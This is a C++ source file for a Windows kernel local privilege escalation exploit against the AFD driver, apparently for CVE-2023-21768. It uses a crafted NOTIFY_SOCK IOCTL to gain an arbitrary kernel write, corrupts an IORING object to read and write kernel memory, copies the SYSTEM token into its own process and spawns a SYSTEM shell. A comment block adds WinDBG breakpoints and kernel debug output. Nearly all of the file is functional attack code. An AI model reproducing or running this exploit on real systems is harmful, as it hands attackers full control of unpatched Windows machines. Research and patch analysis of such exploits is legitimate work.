#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <iostream>
#include "ioring.h"
#include <random>

#pragma comment(lib, "ntdll.lib")
#pragma comment (lib, "ws2_32.lib")

typedef struct UNKNOW_STRUCT {
    INT64 PTR1;
    INT64 PTR2;
    INT64 PTR3;
    INT64 PTR4;
    INT64 PTR5;
    INT64 PTR6;
};

HMODULE ntdll = LoadLibraryA("ntdll.dll");
_NtCreateIoCompletion NtCreateIoCompletion = reinterpret_cast<_NtCreateIoCompletion>(
    GetProcAddress(ntdll, "NtCreateIoCompletion"));
_NtSetIoCompletion NtSetIoCompletion = reinterpret_cast<_NtSetIoCompletion>(
    GetProcAddress(ntdll, "NtSetIoCompletion"));

HANDLE setupSocket() {
    printf("[*] Setting up exploitation prerequisite\n");
    printf("[*] Initialising Winsock DLL\n");
    WORD wVersionRequested;
    WSADATA wsaData;
    int wsaStartupErrorCode;
    wVersionRequested = MAKEWORD(2, 2);
    wsaStartupErrorCode = WSAStartup(wVersionRequested, &wsaData);
    if (wsaStartupErrorCode != 0) {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        printf("[-] Failed (error code: %d)\n", wsaStartupErrorCode);
        return 0;
    }
    printf("[*] Creating socket\n");
    SOCKET sock = INVALID_SOCKET;
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("[-] Failed (error code: %ld)\n", WSAGetLastError());
        return 0;
    }
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("127.0.0.1");
    clientService.sin_port = htons(445); // Valid port connection AFD2
    printf("[*] Connecting to port %i\n", 445);
    int connectResult;
    connectResult = connect(sock, (SOCKADDR*)&clientService, sizeof(clientService));
    if (connectResult == STATUS_SUCCESS) {
        printf("[+] Connected to port %i\n", 445);
        printf("[*] sock: 0x%x -> 0x%x\n", &sock, sock);
    }
    return (HANDLE)sock;
}

INT64 arbitraryWrite(INT64 WriteAddr, INT64 DummyPtr) {
    HANDLE sock = setupSocket();
    HANDLE hEvent = CreateEventA(0, 0, 0, 0);

    ULONG outBuffer = { 0 };
    IO_STATUS_BLOCK ioStatusBlock = { 0 };
    ULONG ioctlCode = 0x12127; // NOTIFY_SOCK

    HANDLE hCompletion = 0;
    NtCreateIoCompletion(&hCompletion, MAXIMUM_ALLOWED, NULL, 1);
    NtSetIoCompletion(hCompletion, 0x1337, &ioStatusBlock, 0, 0x100);

    // NEEDS TO BE CHANGE EACH AFD REQUEST
    LPVOID _PTR = VirtualAlloc((LPVOID)DummyPtr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); 

    UNKNOW_STRUCT BUFF = { 0 };
    BUFF.PTR1 = (INT64)hCompletion;
    BUFF.PTR2 = (INT64)_PTR; 
    BUFF.PTR3 = (INT64)_PTR;
    BUFF.PTR4 = WriteAddr; // write 0x1
    BUFF.PTR5 = 0x1;
    BUFF.PTR6 = 0x1;
    if (NtDeviceIoControlFile((HANDLE)sock, hEvent, nullptr, nullptr, &ioStatusBlock, ioctlCode, &BUFF,
        0x30, 0x0, 0x0) != STATUS_SUCCESS) {
        std::cout << "\t[-] Failed to send IOCTL request to HEVD.sys" << std::endl;
    }
    return 0;
}

INT64 exploit() {
    // pre-allocaiting fakebuffer at [0x01000000]
    LPVOID pFakeRegBuffers = VirtualAlloc((LPVOID)0x1000000, sizeof(QWORD), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset(pFakeRegBuffers, 0, sizeof(QWORD));

    // + 0x0b0 RegBuffersCount  : Uint4B
    // + 0x0b8 RegBuffers : Ptr64 Ptr64 _IOP_MC_BUFFER_ENTRY
    QWORD IORING_OBJECT_ADDR = setupIORing();
    QWORD RegBuffersCount = IORING_OBJECT_ADDR + 0xb0;
    QWORD RegBuffers = IORING_OBJECT_ADDR + 0xb8 + 3; // RegBuffers: 0x00000000 -> 0x01000000 

    // Write 0x1 to RegBuffersCount
    printf("\n[!] Overwriting IORing->RegBuffersCount Object\n");
    arbitraryWrite(RegBuffersCount, 0x11111111);

    // Prompt the user for input
    printf("\n[-] Waiting for any key [Primitive] #1...");
    getchar();
    
    // Write 0x01000000 to RegBuffers
    printf("\n[!] Overwriting IORing->RegBuffers Object\n");
    arbitraryWrite(RegBuffers, 0x22222222);

    printf("\n[+] IORING_STRUCT CORRUPTED WITH ARW!\n");

    // Prompt the user for input
    printf("\n[!] Waiting for any key [Primitive] #2....");
    getchar();

    // LPE attack by copying and replacing current process token with SYSTEM(4) one
    ioring_lpe(pFakeRegBuffers); // 0x01000000
    
    // Prompt the user for input
    printf("[!] Waiting for any key #3 -> [LPE]... \n");
    getchar();

    printf("[+] Token written to our current process!\n");
    printf("[!] Escalating privileges!!\n");

    // Prompt the user for input
    printf("\n[!] Waiting for any key [Primitive]  #3....");
    getchar();

    spawn_shell(); // spawn a new cmd shell with System Privileges
   
    return 0;
}

/*
Thanks to:
    @yarden_shafir
    @chompie1337
    @fuzzysec

REFERENCES:
    https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768
    https://windows-internals.com/
    https://knifecoat.com/Posts/Arbitrary+Kernel+RW+using+IORING's

WinDBG CheatSheet:
    !sym noisy
    .sympath srv*c:\symbols;C:\HEVD
    .reload /f *.*
    ed nt!Kd_Default_Mask 0xf
    .load C:\windbg_ext\pykd.dll
    .cache flushall
    bp afd!AfdNotifyRemoveIoCompletion+0x255
    g

    bp afd!AfdNotifySock+0x45
    bp afd!AfdNotifySock+0x110
    bp afd!AfdNotifySock+0x230
    bp afd!AfdNotifySock+0x144
    bp AfdNotifyRemoveIoCompletion
    bp afd!AfdNotifyRemoveIoCompletion+0xe6
    bp afd!AfdNotifyRemoveIoCompletion+0x255
    g

Debug Outputs:
    0: kd>
    rax=0000000000000001 rbx=00000000dead0000 rcx=4444444444444444
    rdx=0000000000000000 rsi=0000000000000000 rdi=fffff30514aae0b0
    rip=fffff8026176fb81 rsp=fffff30514aae030 rbp=fffff30514aaeb60
     r8=ffff890f26b89820  r9=ffff890f25f07658 r10=ffff890f21624d40
    r11=ffff890f26b8a4a0 r12=0000000000000001 r13=0000000000000020
    r14=fffff30514aae3e0 r15=0000000000000001
    iopl=0         nv up ei pl nz na pe nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202
    afd!AfdNotifyRemoveIoCompletion+0x255:
    fffff802`6176fb81 8901            mov     dword ptr [rcx],eax ds:002b:44444444`44444444=????????


    //
    GET USER STRUCT
    afd!AfdNotifySock+0x2cc:
    fffff801`68a6fefc 498b7340        mov     rsi,qword ptr [r11+40h] ds:002b:ffffe608`281cd460=0000008f99f7f590

    afd!AfdNotifySock+0xea:
    fffff801`68a6fd1a 488b0e          mov     rcx,qword ptr [rsi] ds:002b:ffffe608`297bf3e0=4141414141414141
    2: kd>

    afd!AfdNotifySock+0x110:
    fffff801`68a6fd40 e82bace5fb      call    nt!ObReferenceObjectByHandle (fffff801`648ca970)


    1: kd>
    rax=0000000000000020 rbx=0000000000000000 rcx=fffff30516014100
    rdx=fffff30516014120 rsi=fffff305160143e0 rdi=0000000000000000
    rip=fffff8026176f99a rsp=fffff30516014030 rbp=fffff30516014b60
     r8=0000000000000000  r9=fffff30516014100 r10=0000000000000000
    r11=0000000000000002 r12=0000000000000003 r13=ffff890f278a8d00
    r14=fffff305160143e0 r15=0000000000000001
    iopl=0         nv up ei pl nz na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040206
    afd!AfdNotifyRemoveIoCompletion+0x6e:
    fffff802`6176f99a 49f7e4          mul     rax,r12
    1: kd>

    afd!AfdNotifyProcessRegistration+0x2f:
    fffff801`68a3832b 6683e007        and     ax,7
    1: kd>
    rax=0000000000000001 rbx=0000000000000000 rcx=00000
*/
int main() {
    exploit();
    std::cout << "Press Enter to continue...";
    std::cin.get(); // Wait for the user to press Enter
    return 0;
}

